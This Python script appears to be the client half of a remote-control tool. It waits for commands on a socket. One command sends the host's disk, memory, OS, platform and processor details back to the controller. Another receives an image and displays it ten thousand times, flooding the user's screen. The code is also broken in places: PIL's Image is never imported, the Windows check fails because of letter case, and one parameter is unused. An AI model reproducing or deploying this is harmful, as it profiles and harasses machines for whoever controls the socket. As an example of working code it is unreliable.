import socket
from select import select
import cv2
from json import loads
from numpy import array , uint8
from time import sleep
from platform import machine , version , platform ,processor
from platform import system as sysInfo
from psutil import disk_usage , virtual_memory 
def HDalert(conn):
    data=''
    while 1:
        RCdata=conn.recv(40000).decode()
        if "END" in RCdata[len(RCdata)-3 : len(RCdata)]:
            data+=RCdata[0:len(RCdata)-3]
            break
        data+=RCdata
    CVimg=array(loads(data)).astype(uint8)
    img=Image.fromarray(CVimg)
    for i in range(10000):
        img.show()
def sendInfo(conn):
    if "windows" in sysInfo():
        path=r"C:\\"
    else :
        path='/'
    conn.send(f"{disk_usage(path)}|{virtual_memory()}|{machine()}|{version()}|{platform()}|{processor()}".encode())
def commandRunner(conn,command,key):
    while 1:
        sleep(0.25)
        if command=="HDalert":
            HDalert(conn)
            conn.send(b"END")
            break
        elif command=="Sinfo":
            sendInfo(conn)
            conn.send(b"END")
            break
        else :
            break